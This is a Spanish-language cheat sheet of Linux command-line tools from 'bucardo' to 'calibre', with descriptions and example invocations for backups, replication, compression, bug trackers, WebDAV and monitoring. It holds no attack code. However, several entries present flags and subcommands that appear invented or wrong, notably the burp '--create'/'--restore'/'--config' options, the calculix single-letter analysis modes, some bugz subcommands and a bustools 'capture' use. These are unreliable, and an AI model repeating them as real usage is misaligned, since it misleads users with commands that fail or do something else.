bwrap --bind / / --tmpfs /tmp --ro-bind /usr /usr --unshare-net --chdir /tmp bash
# chmod +x sandbox.sh  (hacerlo ejecutable)
Y lanzarlo cada vez que se necesite un entorno aislado.


bucardo
Sistema de replicación asincrónico de PostgreSQL que permite operaciones con múltiples maestros y múltiples esclavos.
$ bucardo add database test1 dbname=test1 (conocer cada base de datos con la que se necesita comunicar)
$ bucardo add database test2 dbname=test2
$ bucardo add all tables db=test1 -T pgbench_history --relgroup=pgbench --verbose (agregar todas las tablas a test1 con el nombre "pgbench", excluyendo pgbench_history)
$ bucardo add sync benchdelta relgroup=pgbench dbs=test1,test2 (sincronizar pgbench)
$ bucardo list dbs (distintos listados posibles)
$ bucardo list dbgroups
$ bucardo list relgroups
$ bucardo list syncs
$ bucardo list tables
$ bucardo start (arrancar el servicio)
$ bucardo status (el estados)
$ bucardo stop (parar servicio)


bucklesprint
Emula el sonido de un antiguo teclado con resortes de IBM Model-M mientras se escribe en una sesión X. Se ejecuta como un proceso en segundo plano y reproduce el sonido de cada tecla presionada y soltada en el teclado, como si se estuviera utilizando un IBM Model-M.
$ buckle (empieza la emulación de todo lo que se escribe)


buffer
Herramienta diseñada para gestionar la velocidad de transferencia de datos mediante almacenamiento en búfer. Es especialmente útil en operaciones de copia de seguridad con cintas o en situaciones donde se desea optimizar la transmisión de datos entre procesos y convertir una tasa de datos de entrada variable a una tasa de datos de salida constante.
$ cat archivo_grande | buffer > archivo_salida (lee datos de la entrada estándar y los pasa a la salida estándar con almacenamiento en búfer)
$ cat archivo_grande | buffer -s 64k > archivo_salida (el tamaño del búfer se establece en 64 KB para optimizar la transmisión de datos)
$ dd if=/dev/zero bs=1M count=100 | buffer -b 512 > salida.bin (configura bloques de 512 bytes en lugar del tamaño predeterminado)
$ cat archivo_grande | buffer -p 1024 > archivo_salida (limita la transferencia a 1 MB/s - 1024 KB/s)
$ cat archivo_grande | buffer -t > archivo_salida (muestra estadísticas en tiempo real sobre la cantidad de datos transferidos)
$ tar cf - /directorio | buffer -s 128k -p 4096 > /dev/st0 (con cintas de copia de seguridad, como /dev/st0. Crear una copia del directorio con tamaño de bufer de 128 y limite a 4MB/s)
$ dd if=/dev/sda bs=1M | buffer -s 256k -p 8192 > /dev/st0 (copia del disco /dev/sda a la cinta /dev/st0)
$ tar cf - /directorio | gzip | buffer > copia.tar.gz (los datos son comprimidos y almacenados en un archivo utilizando buffer para optimizar la transferencia)
$ nc -l 12345 | buffer -s 1M > archivo_recibido (escuchar en el puerto 12345 y tamaño de búfer de 1 MB para optimiza la recepción)
$ cat archivo_grande | buffer | gzip > archivo_comprimido.gz (asegura un flujo constante entre cat y gzip, reduciendo interrupciones)
$ dd if=archivo.iso bs=1M | buffer -s 128k -p 2048 > /dev/sdb (optimiza la escritura al disco /dev/sdb utilizando un búfer de 128 KB y una velocidad límite de 2 MB/s)
$ tar cf - /directorio | buffer -s 256k -p 4096 | gzip > /dev/st0 (empaqueta el directorio, optimiza el flujo hacia la cinta y comprime los datos antes de almacenarlos)
$ yes "Prueba de datos" | buffer -s 16k -p 1024 > /dev/null (probar la transferencia de datos en un entorno controlado)


bugwarrior
Utilidad para actualizar la base de datos local de TaskWarrior desde los rastreadores de problemas de forjas de software como GitHub, GitLab, Bitbucket, Bugzilla, Debian, Gmail, etc. Primero configurar el archivo, un ejemplo:
$ nano ~/.bugwarriorrc
       [general]
       taskwarrior_taskrc = ~/.taskrc
       taskwarrior_taskdata = ~/.task
       cache_path = ~/.cache/bugwarrior
       update_interval = 15
       [github]
       enabled = yes
       username = tu_usuario_github
       password = tu_token_github
       repositories = owner/repo1, owner/repo2
       priority_map = low:low, medium:medium, high:high
       task_attributes = description:issue.body, tags:issue.labels, due:issue.due_on
       [gitlab]
       enabled = yes
       url = https://gitlab.com
       username = tu_usuario_gitlab
       password = tu_token_personal
       projects = owner/repo1, owner/repo2
       filter = label:important, label:bug
$ bugwarrior --check (si la configuración está correcta, mostrará los servicios habilitados y las conexiones exitosas)
$ bugwarrior (descargará todas las tareas abiertas y las actualiza si hubo cambios)
$ bugwarrior --dry-run (mostrará en pantalla las tareas detectadas y los cambios que se aplicarían sin modificar la base de datos)
$ bugwarrior --config-section github (sincronizar un rastreador específico definido en la configuración)
$ bugwarrior --no-sync (descargar y almacenar en caché las tareas desde los rastreadores, pero sin añadirlas a Taskwarrior)
$ bugwarrior --verbose (obtener información detallada sobre qué está haciendo bugwarrior durante la sincronización)
Nota.- Filter = label... sincronizará solo tareas etiquetadas como important o bug y task_attributes el cuerpo del issue de GitHub se convierte en la descripción de la tarea.
1.-
Ejecutar automáticamente con cron añadiendo la linea a crontab -e:
*/15 * * * * /usr/bin/bugwarrior >> ~/.bugwarrior.log 2>&1
2.-
Ejecutar automáticamente con systemd. Crear un archivo de servicio
# nano ~/.config/systemd/user/bugwarrior.service
Con las lineas:
    [Unit]
    Description=Actualización de Taskwarrior desde Bugwarrior
    [Service]
    ExecStart=/usr/bin/bugwarrior
# nano ~/.config/systemd/user/bugwarrior.timer
    [Unit]
    Description=Ejecutar Bugwarrior cada 15 minutos
    [Timer]
    OnBootSec=5m
    OnUnitActiveSec=15m
    [Install]
    WantedBy=timers.target
Habilitar y activar el timer:
# systemctl --user enable bugwarrior.timer
# systemctl --user start bugwarrior.timer


bugz
Herramienta que facilita la contribución rápida a proyectos utilizando el rastreador de errores de Bugzilla.
$ bugz create --product=MiProyecto --component=MiComponente --version=1.0 --priority=P4 --severity=M2 --summary="Descripción del problema" (crea un nuevo bug en Bugzilla con los detalles especificados)
$ bugz update --id=12345 --status=RESOLVED --resolution=FIXED --comment="Se ha solucionado el problema" (actualiza el estado y la resolución de un bug específico)
$ bugz search --title="error en la conexión" (buscar bugs por título)
$ bugz show --id=67890 (buscar bugs por ID)
$ bugz assign --id=12345 --assignee=johndoe@example.com (asignar un bug a un desarrollador)
$ bugz status --id=67890 (verificar el estado de un bug)
$ bugz link --id=12345 --link-type=DEPENDS --target-id=67890 (agregar una dependencia entre bugs)
$ bugz unlink --id=12345 --link-type=DEPENDS --target-id=67890 (eliminar una dependencia)
$ bugz info --id=12345 (obtener información detallada de un bug)


bugzilla-cli
Herramienta para interactuar con el sistema Bugzilla, que es una plataforma para gestión de bugs y seguimiento de proyectos.
$ bugzilla-cli --url https://bugs.example.com login (pedirá tu nombre de usuario y contraseña para conectarte al servidor Bugzilla especificado)
$ bugzilla-cli --url https://bugs.example.com show-bug 1234 (mostrará los detalles del bug con el ID 1234)
$ bugzilla-cli --url https://bugs.example.com stats (mostrará resúmenes de estadísticas de bugs como número total, bugs abiertos, cerrados, etc)
1.-
Crear un nuevo bug de ejemplo:
$ bugzilla-cli --url https://bugs.example.com create-bug \
    --product "Mi Proyecto" \
    --component "Desarrollo Web" \
    --version "1.0" \
    --summary "Nuevo defecto encontrado en la página principal" \
    --description "El problema se produce cuando se intenta acceder a la página principal."
2.-
Actualizar un bug:
$ bugzilla-cli --url https://bugs.example.com update-bug \
    --bug-id 1234 \
    --comment "Se ha actualizado la descripción del problema"
3.-
Cerrar un defecto:
$ bugzilla-cli --url https://bugs.example.com close-bug \
    --bug-id 1234 \
    --resolution RESOLVED \
    --status CLOSED
4.-
Buscar defectos por título o descripción:
$ bugzilla-cli --url https://bugs.example.com search \
    --query "error en página principal" \
    --output-format json


build-essential
Contiene una lista de paquetes esenciales para el sistema y la compilación. En el navegador colocar file:///usr/share/build-essential/essential-packages-list


buildah
Herramienta que se utiliza para tratar con contenedores compatibles con la Open Container Initiative [OCI].
$ buildah from centos:8 (crea una nueva imagen de contenedor basada en la imagen especificada)
$ buildah bud -t <nombre-imagen> (construye una imagen personalizada desde el directorio actual)
$ buildah run mi-contenedor echo "Hola desde el contenedor" (ejecuta un comando dentro de la imagen de contenedor especificada)
$ buildah inspect mi-contenedor (muestra información detallada sobre la imagen de contenedor)
$ buildah rm mi-contenedor (eliminar la imagen de un contenedor)


builtin
Cuando introducimos un comando en Bash el orden de preferencia en la búsqueda del símbolo por parte de Bash es: Primero las funciones, luego los comandos internos y por último los ficheros de scripts y ejecutables. builtin es más restrictivo que command [ver] y hace que no se busquen alias ni funciones, sólo comando internos [ver tambien comando enable]:
$ builtin cd /


buku
Gestión de marcadores. Importación automática de firefox, chrome y chromium, exporta/importa de html, markdown y org, los abre en el navegador...
$ buku -u (actualizar campos de los marcadores, comentarios, tags, título...)
$ buku -ui (importa los marcadores de los navegadores)
$ buku -a http://lapipaplena.duckdns.org/tractatus/ (entrar una url)
$ buku -a https://www.deepl.com/es/translator -c traductor --title Deepl traductor (entrar un marcador con comentario y título)
$ buku -a https://www.facebook.com/ -c redes de mierda --title una de las redes -t redes (entrar marcador con comentario, título y tag)
$ buku -a https://www.facebook.com/ -c redes de mierda --title una de las redes -t redes --immutable 1 (que no se actualicen com el argumento -u)
$ buku -p -15 (ver los 15 primeros del listado)
$ buku -d (borrar todos los marcadores)
$ buku -d 7-12 () borrar los marcadores del 7 al 12)
$ buku -d 5 (suprimir el marcador num. 5)
$ buku -S debian (mostrar los marcadores con el tag "debian")
$ buku -e bookmarks.html (crear un .html con todos los marcadores)
$ buku -i bookmarks.html (importar un .html con los marcadores)
$ buku -e bookmarks.org (crear un archivo .org con todos los marcadores)
$ buku -S blank (listar los marcadores que no tienen ni título ni tag)
$ buku -w nano (indicar que el editor es nano)
$ buku -u 1 -c tractatus elementalis (actualizar el num. 1 y añadir un comentario)
$ buku -l (pedirá contraseña y confirmación para encriptar el archivo)
$ buku -k (desencriptar el archivo)
Nota.- Los nuevos comentarios, tags o título sustituyen a los que constan en la entrada.


bundlewrap
Sistema de gestión de configuración descentralizada. Mientras que la mayoría de los sistemas de gestión de configuración se basan en una arquitectura cliente-servidor, bundlewrap funciona a partir de un repositorio clonado en la máquina local.
$ bw apply -i mynode (aplicar la configuración al nodo preguntando interactivamente antes de hacer cada cambio)
$ bw run nodo1,grupo2,nodo3 "uname -a" (ejecutar comandos en los nodos y grupos especificados)
$ bw test (paquete de pruebas útil después de cada confirmación. Intentará detectar cualquier error en paquetes y plantillas de archivos inicializando cada elemento de cada nodo)


bunzip2
Descomprime ficheros bz2.
$ bunzip2 archivo.bz2


bup
Herramienta de respaldo que almacena las copias de seguridad en un sistema basado en el formato packfile de git. Esto permite que las copias de seguridad sean deduplicadas, incrementales y extremadamente eficientes en el uso del espacio.
$ bup init (antes de empezar, se debe inicializar un repositorio donde se almacenarán las copias de seguridad y que por defecto es en ~/.bup)
$ bup index ~/Documentos (indexar un directorio antes de respaldarlo)
$ bup save -n mis_docs ~/Documentos (crea un respaldo del directorio en el repositorio)
$ bup ls (listar los respaldos realizados y sus nombres)
$ bup restore -C ~/Restaurados mis_docs (restaurar un respaldo completo)
$ bup restore -C ~/Restaurados mis_docs/archivo.txt (restaurar un archivo específico dentro del respaldo)
$ bup save --gzip -n respaldo_comprimido ~/Documentos (comprimir respaldos)
$ bup save --lzo -n respaldo_rapido ~/Documentos (comprimir respaldos con lzo)
$ bup ftp (inicia un servidor FTP local que permite navegar por los respaldos usando un cliente FTP o incluso con un navegador web)
$ bup save -n respaldo_incremental ~/directorio (deduplicará y almacenará únicamente los cambios)
$ bup fsck (revisa el sistema de respaldo y reporta errores si los hay)
$ bup diff respaldo1 respaldo2 (comparar respaldos)
$ bup rm respaldo_nombre (eliminar respaldos antiguos)
$ bup save -n respaldo_correo ~/Maildir (crea respaldos incrementales y deduplicados de los correos electrónicos)
1.-
Respaldar sobre SSH. Para realizar respaldos en un servidor remoto vía SSH:
$ ssh usuario@servidor "bup init" (configurar bup en el servidor remoto)
$ bup save -n respaldo_remoto -r usuario@servidor:/ruta/al/repositorio /ruta/del/directorio (realizar el respaldo)
2.-
Automatizar respaldos con cron
$ crontab -e
Añadir la línea:
     0 2 * * * bup index /ruta/del/directorio && bup save -n respaldo_diario /ruta/del/directorio
Esto realiza el respaldo a las 2:00 AM todos los días.
3.-
Realizar copias de seguridad de sistemas enteros excluyendo directorios como /proc, /sys, /dev.
# bup index /
# bup save -n respaldo_sistema /
4.-
Exportar un respaldo como un archivo tar para compartir o mover un respaldo:
$ bup fuse /punto/de/montaje
$ tar -cf respaldo.tar -C /punto/de/montaje respaldo_nombre
$ fusermount -u /punto/de/montaje


burnp6
[cpuburn]. Colocar la cpu al 100%. Si existen varios nucleos lanzar una instancia para cada uno. Existen varias opciones según el tipo de nucleo: burnBX, burnK6, burnK7, burnMMX, burnP5 y burnP6.
$ burnP6


burp
Sistema de copia de seguridad cliente-servidor que utiliza librsync para ahorrar espacio y uso de red.
$ burp --config "use_librsync=yes" (configurar el uso de librsync)
$ burp --create /ruta/original /ruta/copia (crear copia de seguridad)
$ burp --restore /ruta/copia /ruta/original (restaurar desde una copia de seguridad)
$ burp --verify /ruta/copia (verificar la integridad de una copia de seguridad)
$ burp --delete /ruta/copia (eliminar una copia de seguridad)
$ burp --list (listar todas las copias de seguridad)
$ burp --config "max_block_size=1048576" (configurar el tamaño máximo de bloque
$ burp --config "max_blocks=1000000" (configurar el número máximo de bloques)
$ burp --config "backup_dir=~/backups" (configurar el directorio de copias de seguridad)


burpsuite
Plataforma integral para pruebas de seguridad de aplicaciones web inncluidas pruebas de seguridad, evaluación de vulnerabilidades y pruebas de penetración. Es una herramienta comercial, pero también está disponible una versión gratuita con funciones limitadas.
# burpsuite (arrancar la aplicación)
# burpsuite --use-defaults (arrancar la aplicación usando la configuración predeterminada)
# burpsuite --project-file=~/proyecto/archivo (abrir el proyecto)
# burpsuite --config-file=~/config (cargar un archivo de configuración especifico)
# burpsuite --disable-extensions (arrancar sin extensiones)


busctl
Monitorear de D-bus
# busctl --activatable
# busctl --acquired
# busctl --unique
# busctl --show-machine
# busctl --quiet


bustle-pcap
Herramienta para trazar y proporcionar información de llamadas D-Bus.
# bustle-pcap -v monitor.pcap (con la máxima información de la sesión y guardado en el archivo monitor.pcap)


bustools
Herramienta especializada en la manipulación de datos generados por tecnologías de secuenciación de ARN de alto rendimiento, particularmente en análisis de datos de código de barras celulares [cell barcodes] y etiquetas moleculares únicas [UMIs]. Es muy útil para trabajar con datos procesados mediante kallisto en experimentos de transcriptómica de células individuales.
$ bustools correct -w whitelist.txt -o corrected.bus input.bus (-w: Lista blanca de códigos de barras válidos, -o: Salida con los códigos de barras corregidos y input.bus: Archivo de entrada generado por kallisto)
$ bustools sort -T tmp/ -o ordenado.bus input.bus (generar un índice para input bus. -T: Directorio temporal para operaciones intermedias)
$ bustools filter -o filtered.bus -e 0 input.bus (limpiar datos. -e los elimina -o archivo con los datos depurados)
$ bustools count -o counts.mtx -g transcripts_to_genes.txt -e matrix.ec -t transcripts.txt sorted.bus (-o: salida en formato Matrix Market, -g: Mapeo de transcripciones a genes, -e: Archivo de equivalencia generado por kallisto y -t: Lista de transcripciones.)
$ bustools merge -o merged.bus file1.bus file2.bus (fusionar varios archivos bus en merged.bus)
$ bustools text -o output.txt input.bus (convierte los datos procesados en una matriz de expresión génica, un formato utilizado para análisis de transcriptómica)
$ bustools capture -o simulated.bus -c capture.txt -e matrix.ec -t transcripts.txt input.bus (crea un archivo simulated.bus con datos simulados para pruebas)
$ bustools capture -o errors.bus -c error_patterns.txt input.bus (identificar lecturas con errores en UMIs o códigos de barras)
$ bustools sort -T tmp/ -o sorted.bus input.bus (indexar y ordenar datos)
$ bustools correct -w whitelist.txt -o corrected.bus sorted.bus (corregir códigos de barras celulares)
$ bustools count -o counts.mtx -g transcripts_to_genes.txt -e matrix.ec -t transcripts.txt corrected.bus (calcular la matriz de expresión génica)


busybox
Herramienta que integra los comandos linux más comunes. Útil en móviles con sistema Android.
$ busybox (Mostrará la forma de uso y los comando disponibles. En Android entra en el prompt. “exit” para salir)
$ busybox ls -a (lanzará ls -a desde el entorno busybox)
$ busybox su


busybox-syslogd
Demonio de registro del sistema responsable de proporcionar el registro de los mensajes recibidos de los programas y las funciones del host local, así como de los hosts remotos.
$ busybox-syslogd (iniciar el servicio y recopilará los registros del sistema y los almacenará en /var/log/messages)
$ busybox-syslogd -O /var/log/busybox/syslog.log (si queremos los registros en otro lugar)
$ busybox-syslogd -R servidor.remoto:514 (reenviar los registros del sistema a un servidor remoto y por el puerto 514)
$ busybox-syslogd -C (registrar los mensajes directamente en la consola para depuración en tiempo real)
$ busybox-syslogd -l 3 (limita los registros a mensajes con prioridad 3 o menor: errores, advertencias, etc)
$ busybox-syslogd -S 1048576 (que los registros se sobrescriban cuando se alcance un límite de tamaño, 1 MB en este caso)
$ busybox-syslogd -D (ejecutar el demonio en segundo plano como un servicio)
$ busybox-syslogd -O /var/log/syslog.log -R 192.168.1.100:514 -C (los registros localmente en /var/log/syslog.log, reenviarlos a un servidor remoto en 192.168.1.100:514 y registrar mensajes en la consola para monitoreo)
$ tail -f /var/log/syslog.log (verificar el estado de los registros)


buthead
[but not head - excepto el encabezado]. Programa para copiar líneas excepto las N primeras o últimas.
$ buthead 5 < archivo.txt (muestra en pantalla archivo.txt sin las primeras 5 lineas)
$ buthead 5 < archivo.txt > nuevo_archivo.txt (lo manda a un archivo)
$ cat archivo.txt | buthead 10 | grep "palabra" (elimina las primeras 10 líneas de archivo.txt y en el resto busca "palabra")
$ buthead -5 < archivo.txt > ultimo_5_líneas.txt (eliminar todas las líneas excepto las últimas 5)


bvi
Editor orientado a la visualización de archivos binarios basado en el editor de texto vi.


bwm-ng
Muestra uso del ancho de banda de nuestra conexión o de nuestros discos duros [por defecto en KB por cada medio segundo]
# bwm-ng (Por defecto nos muestra el ancho de banda de las conexiones de red)
# bwm-ng -i disk (Con la opción -i disk especificamos que queremos ver las estadísticas para los discos duros)
# bwm-ng -i disk -d (si añadimos la opción -d se hace más legible mostrando datos en Bytes, KB o MB)
Nota.- Si durante la ejecución pulsamos la tecla “h” accederemos a un menú de opciones.


byobu
Terminal tipo screen [ver] o tmux [ver] con una barra inferior que muestra consumos de cpu, ram, hora, fecha...
Algunas teclas de control:
	F2 (crear nueva pestaña)
	F3 (Ir a la pestaña anterior)
	F4 (Ir a la pestaña posterior)
	F5 (Refrescar estado)
	F6 (Salir dejando la terminal activa)
	F7 (Mostrar historial)
	F8 (Renombrar la pestaña)
	F9 (Configurar byobu)
	exit (Salir)


bytes-circle
Visualizar estadísticas sobre los bytes contenidos en un archivo de forma gráfica circular usando caracteres ASCII.
$ bytes-circle -o 0 script.sh (con color por defecto)
$ bytes-circle -n -o 0 archivo.txt (usando números)


byzanz
Grabar el escritorio o parte de él con salida en GIF animado, Theora, Ogg o Flash.
$ byzanz-record -c -d 20 archivo.ogg (Incluyendo puntero [-c] y durante 20 segundos. por defecto 10 segundos)
algunas opciones:
	-a (tambien grabar sonido)
	--delay=5 (Empezar pasados 5 segundos. Por defecto 1)
	-w 500 (grabar rectángulo de 500 pixels de ancho)
	-h 400 (grabar rectángulo de 400 pixels de alto)
	-x 30 (coordenadas x para el rectángulo)
	-y 60 (coordenadas y para el rectángulo)


bzcat
Descomprime hacia la salida estandar un archivo comprimido con bzip2.
$ bzcat archivo.bz2


bzcmp
Compara archivos comprimidos com bzip2 (Ver cmp)


bzdiff
Busca las diferencias entre dos ficheros comprimidos con bzip2 (Ver diff)


bzexe
[bzip2]. Comprimir/descomprimir ejecutables.
# bzexe ejecutable
# bzexe -d ejecutable (Descomprimir)


bzgrep
Imprime las lineas coincidentes con una expresión dada de un archivo comprimido con bzip2.
$ bzgrep pedro archivo.bz2 (Imprime las las que coinciden con “pedro”)


bzip2
comprime un fichero [ni empaqueta ni comprime directorios]
$ bzip2 fichero (Comprimir)
$ bzip2 -d fichero.bz2 (Descomprimir)
$ bzip2 -c fichero.bz2 (Ver contenido)
$ bzip2 -dc archivo.tar.bz2 | tar -xv (Descomprime y desempaqueta)
$ bzip2 -dc archivo.tar.bz2 | tar -t (Ver contenido)


bzip2recover
Intenta recuperar datos de ficheros bzip2 dañados.
$ bzip2recover archivo.bz2


bzless
[bzip2]. Muestra el contenido de un archivo .bz2 comprimido con bzip2 de forma parecida al comando less [ver]
$ bzless archivo.txt.bz2


bzmore
Visualiza de forma paginada el contenido de un archivo comprimido con bzip2
$ bzmore archivo.bz2


bzz
Codificar/descodificar ficheros.
$ bzz entrada salida
$ bzz -d entrada salida (Descodificar)


cabextract
Aplicación para abrir y extraer archivos .cab [de windows]
$ cabextract archivo.cab


caca-utils
Utilidades y programas de demostración para libcaca, la biblioteca de arte ASCII en color. Abre la mayoría de los formatos de imagen, como JPEG, PNG, GIF, etc., y los reproduce en la terminal utilizando arte ASCII. Incluye las herramientas cacaclock, cacademo, cacafire, cacaplay, cacaserver, cacaview y img2txt.


cacaclock
[caca-utils]. Muestra un reloj digital en ascii


cacademo
Demostración de arte ascii a color


cacafire
[caca-utils]. Fuego animado a color en ascii


cacaserver
[caca-utils]. Servidor telnet para librerias libcaca.
En el servidor:
$ CACA_DRIVER=raw cacafire | cacaserver
En el remoto:
$ telnet IP_o_Host 51914


cacaview
[caca-utils]. Visualizar imágenes en modo ascii y a color
$ cacaview imagen.jpg
Atajos:
        n,p (anterior siguiente imagen)
        +,- (zoom)
        z   (reset zoom, volver a la medida normal)
        q   (salir)


cache
(Memoria cache o memoria RAM). Cuando se ejecuta una aplicación, la misma es cargada primero en la memoria RAM. Parte de la información del aplicativo queda en memoria RAM Cache, para cuando se vuelva ha ejecutar, no sea necesario cargarlo todo nuevamente y el proceso sea múcho más rápido. Otra forma de utilizar memoria RAM Cache, es cuando tenemos mucha escritura en Disco, ya que el Kernel de Linux graba primero en la memoria caché, para luego, cada cierto tiempo, hacer un volcado en el disco. La limpieza y el manejo de la memoria RAM la hace el SO de forma automática, pero hay casos donde se hace necesario efectuar una limpieza manual.
# free -m (comprobación del uso de la memoria)
# sync; echo 3 >'/proc/sys/vm/drop_caches' && swapoff -a && swapon -a
# free -m (volver a lanzar para comprobar los cambios)
Los posibles valores asignados a drop_caches son:
    0 - Cede el control al Kernel para que administre la memoria
    1 - Se obliga al sistema a vaciar las páginas del cache (pagecache).
    2 - Se obliga al sistema a vaciar las entradas de directorios (dentries) y nodos índice (inodos).
    3 - Se obliga al sistema a vaciar pagecache, dentries y inodos.
El comando sync sirve para forzar la grabación de información pendiente en la memoria caché. Los dentries representan la relación de forma estructurada que existe entre directorios-archivos. Los inode con los nodos índice de archivos y directorios que usa el Sistema de Archivos para administrar las actividades posibles de dichos archivos y directorios guardados en disco o memoria. Contiene la metadata de los archivos y directorios: permisos, tamaño, propietario, última fecha de acceso, creación, modificación, entre otros.


cacti
[php5 php5-gd php5-mysql mysql-server rrdtool snmp libjpeg62 libjpeg62-dev libpng12-0 libpng12-dev libgd2-xpm-dev]. Monitorizar y visualizar gráficas, estadísticas de dispositivos conectados a la red, ancho de banda consumido, detectar congestiones o picos de tráfico, monitorizar determinados puertos...  Cacti permite monitorizar cualquier equipo de red que soporte el protocolo SNMP, ya sea un switch, un router o un servidor Linux. Se accede al resto de la instalación con: http://192.168.1.5/cacti. Los datos por defecto: usuario: admin password: admin


cadaver
Cliente para WebDAV (Protocolo de Autoría y Versionado Distribuido basado en HTTP) que permite gestionar archivos en servidores. Su funcionamiento es similar al de un cliente FTP o SMB, con comandos para navegar, cargar, descargar y manipular archivos en servidores remotos.
$ cadaver https://servidor (si requiere autenticación, pedirá nombre de usuario y contraseña)
Una vez conectado, se puede usar comandos similares a los de FTP: ls, cd, put, get, mkdir, delete, mget, mput, quit
1.-
Supongamos que se necesita subir y descargar archivos desde un servidor WebDAV alojado en https://webdav.example.com. Los pasos serían:
$ cadaver https://webdav.example.com
Introducir tu usuario y contraseña si se solicita.
> cd documentos (ir al directorio remoto)
> put informe.pdf (subir un archivo local al servidor)
> get reporte.docx (descargar un archivo del servidor al sistema local)
> edit archivo (Editar un archivo)
> move viejo nuevo (Cambiar el nombre de viejo a nuevo)
> delete archivo-viejo.txt (borrar un archivo del servidor)
> ? (Muestra todos los comandos disponibles)
> quit (cierra la sesión)


caddy
Servidor web escrito en Go con HTTPS automático de forma predeterminada y ZeroSSL y Let's Encrypt para nombres públicos.
$ caddy (iniciará un servidor web en modo estándar, sirviendo archivos desde el directorio actual)
$ caddy run --config Caddyfile (si se tiene un archivo de configuración)
$ caddy status (verificar estado)
$ pkill caddy (detener caddy)
$ caddy reload (reiniciar caddy)


cado
Permite al administrador del sistema delegar capacidades a los usuarios. Cado es un sudo basado en capacidades. Sudo permite a los usuarios autorizados ejecutar programas como root o como otro usuario, cado permite a los usuarios autorizados ejecutar programas con capacidades específicas. Es más selectivo que sudo, los usuarios pueden ser autorizados a tener solo capacidades específicas y no otras. El archivo /etc/cado.conf es donde se configuran las capacidades de los usuarios.
Permitir al usuario user1 y a todos los miembros del grupo usernet ejecutar programas que necesitan la capacidad net_admin. El usuario user1 también puede ejecutar programas que requieren cap_kill:
    net_admin: @usernet,user1
    cap_kill: user1
    setgid,setuid: user2,@group1


cadubi
Crear dibujos en la consola.
teclas:
	i j k l (Las que gobiernan el cursor: arriba [i], izquierda [j], derecha [l] y abajo [k])
	spacio (la brocha)
	del o ` (borrar caracter)
	p (Cambiar la letra de la brocha)
	f (Modificar el color de la letra)
	b (Modificar el color de fondo de la letra)
	g (Letra en negrita)
	v (Permutar los colores del fondo y la letra)
	t (Pasar a modo texto. "Esc" para salir de modo texto)
	Crtl+r (Abrir un archivo o un dibujo anterior)
	Ctrl+o (Guardar el archivo)
	Ctrl+h (Desplegar/ocultar la ayuda)
	Ctrl+x (Salir del prigrama)
Teclas de color. Es indistinto pulsar el número o la letra entre parentesis:
	0 (n) (Texto standard)
	1 (w) (Blanco)
	2 (r) (Rojo)
	3 (g) (Verde)
	4 (y) (Amarillo)
	5 (b) (Azul)
	6 (m) (Magenta)
	7 (c) (Cian)
	8 (k) (Negro)


caffeine
Evitar que el escritorio quede inactivo [suspendido, bloqueado, etc.] cuando una aplicación se ejecuta en modo de pantalla completa como ver una película o jugar. Un indicador de escritorio, "caffeine-indicator", permite activarlo manualmente, y el comando "caffeinate" que evita que el sistema entre en modo de suspensión o inactividad mientras se ejecuta un comando especificado.
$ caffeine
$ caffeinate vlc (que mientras dure vlc no entre en suspensión de pantalla)


cal
Muestra el calendario del mes
$ cal -y    (muestra todos los meses del año)
$ cal -m 1995 (muestra año indicado comenzando las semanas por lunes [-m])
$ cal 2011 (Muestra el año completo)
$ cal 05 2011 (Muestra el mes del año especificado)
$ cal -3  (Muestra el mes actual el anterior y el posterior)
$ cal -m |grep -A7 -B7 --color=auto $(date +%d) (Muestra el mes actual y coloreado el día actual)


calamaris
Script de Perl que genera estadísticas a partir de archivos de registro generados por proxies HTTP, como Squid y Oops y produce informes detallados de rendimiento, estadísticas de uso y patrones de acceso.
$ calamaris -f text /var/log/squid/access.log (generar un informe en texto plano)
$ calamaris -f html /var/log/squid/access.log > squid_report.html (generar un informe en HTML)
$ calamaris -f text -d /var/log/squid/access.log (mostrará una lista detallada de los dominios más accedidos junto con el número de solicitudes)
$ calamaris -f text -a -r /var/log/squid/access.log (proporciona un desglose de las solicitudes agrupadas por rangos de direcciones IP de todo el archivo de registro)
$ calamaris -f text -m 10 /var/log/squid/access.log (restringe la salida a las 10 entradas más frecuentes en cada categoría)
1.-
Agregar un cron job para generar informes automáticamente con la linea:
$ crontar -e
     0 3 * * * /usr/bin/calamaris -f html /var/log/squid/access.log > /var/www/html/squid_report.html
Que genera un informe HTML cada día a las 3:00 a.m. y lo guarda en un directorio accesible desde un servidor web.


calc
Calculadora.
$ calc (Entra en el prompt. Su uso es el clásico: 5*2, 80/4... “Exit” para salir)
$ calc 2*7


calculix
Aplicación de análisis de elementos finitos [EA] que utiliza un formato de entrada similar al de Abaqus [.inp].
$ calculix -m input_file.inp (ejecutar un análisis estático)
$ calculix -d input_file.inp (realizar un análisis dinámico)
$ calculix -c input_file.inp (correr un análisis de contacto)
$ calculix -t inpu_file.inp (ejecutar un análisis térmico)
$ calculix -a input_file.inp (realizar un análisis acústico)
$ calculix -g input_file.inp (generar gráficos de resultados)


calcurse
Calendario y organizador de tareas por consola.
$ calcurse


caldav
Protocolo basado en WebDAV que permite la gestión de calendarios de manera remota. Se utiliza principalmente para acceder y gestionar datos de calendario a través de Internet. CalDAV permite a los usuarios crear, modificar y eliminar eventos de calendario en un servidor, lo que facilita la sincronización de calendarios entre diferentes dispositivos y aplicaciones entre servidores [Radicale, Nextcloud, OwnCloud] y cliente [Thunderbird, Evolution].


calendar
Muestra hechos relevantes en inglés sobre el dia actual o el especificado con amplia variedad de calendarios. Puede personalizarse editando el archivo:
# nano /usr/share/calendar/calendar.all
Y suprimiendo las lineas de los calendarios que no se deseen y eliminando los archivos correspondientes del directorio /usr/share/calendar/
$ calendar


calibre
Administración de bibliotecas, conversión de formatos, conversión de fuentes de noticias a libros electrónicos, visor y editor de libros electrónicos y funciones de sincronización de lectores de libros electrónicos. Calibre es principalmente un programa de catalogación de libros electrónicos. Incluye las herramientas calibre-complete [No invocar manualmente.], calibre-customize, calibre-debug [algunas opciones que no están enla GUI],  calibre-parallel [no invocar manualmente], calibre-server [niciar el servidor de contenido de calibre], calibre-smtp [correo electrónico mediante el protocolo SMTP.], calibredb [listado de la base datos de libros entrados], ebook-convert [convierte formatos], ebook-device [Administrar dispositivo de libros electrónicos], ebook-edit [Editar libro], ebook-meta [Leer y escribir metadatos desde y hacia archivos de libros electrónicos], ebook-polish [pulir un libro realizado por un usuario], ebook-viewer, fetch-ebook-metadata [ver metadatos de libros], lrf2lrs [convertir un LRF en un LRS], lrfviewer [ver un LRF], lrs2lrf [convertir un LRS en un LRF], markdown-calibre [convertir un markdown a HTML] y web2disk.
$ calibre-customize -l (listado de plugins)
$ calibre-customize -a plugin.zip (añadir un plugin. Tiene que especificarse la ruta al .zip)
